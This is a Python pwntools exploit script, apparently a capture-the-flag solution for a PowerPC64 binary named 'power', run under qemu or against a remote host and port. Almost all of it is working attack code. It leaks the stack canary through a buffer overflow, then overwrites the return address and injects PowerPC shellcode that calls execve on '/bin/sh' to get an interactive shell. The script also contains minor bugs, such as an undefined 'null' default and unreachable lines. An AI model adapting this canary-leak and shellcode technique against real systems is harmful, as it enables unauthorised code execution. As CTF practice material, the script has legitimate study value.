from pwn import *
import sys

context.log_level = 'debug'
context.endian = 'big'
context.arch='powerpc64'
Debug = sys.argv[1]

libc = ELF('./lib/libc.so.6')

def get_sh(other_libc=null):
    if Debug == '1':
        return process(["qemu-ppc64-static","-g","1234","-L","./","./power"])
        log.info('Please use GDB remote!(Enter to continue)')
        pause()
        return r
    if Debug == '2':
    	r = remote("34.92.63.126",59011)
    	return r
    else:
        return process(["qemu-ppc64-static","-L","./","/power"])

def wwrite(idx, sz, ct):
	r.sendlineafter('Ur choice: ', str(1))
	r.sendlineafter('Which: ', str(idx))
	r.sendlineafter('Size: ', str(sz))
	r.sendafter('Content: ', ct)

def magic(idx):
	r.sendlineafter('Ur choice: ', str(114514))
	r.sendlineafter('Give me a number: ', '83')
	r.sendlineafter('OK now input a index: ', str(idx))

r = get_sh()

sc = '''
li 4, 0
li 5, 0
li 0, 11
mflr 3
subi 3, 3, 0x10
sc
'''
r.recvuntil('Say something: ')
r.send(b'A'*0x50+b'B')

r.recvuntil(b'B')
canary = u64(b'\x00'+r.recv(7))
r.sendlineafter('Would you like to change it?', 'Y')
r.sendafter('OK, say it again: ', b'A'*0x50+p64(canary)+b'B'*0x18+b"/bin/sh\x00"+p64(0x80+0x00000040008008d8)+asm(sc))

success(hex(canary))
r.interactive()

# 00000040008008d8 + 0x80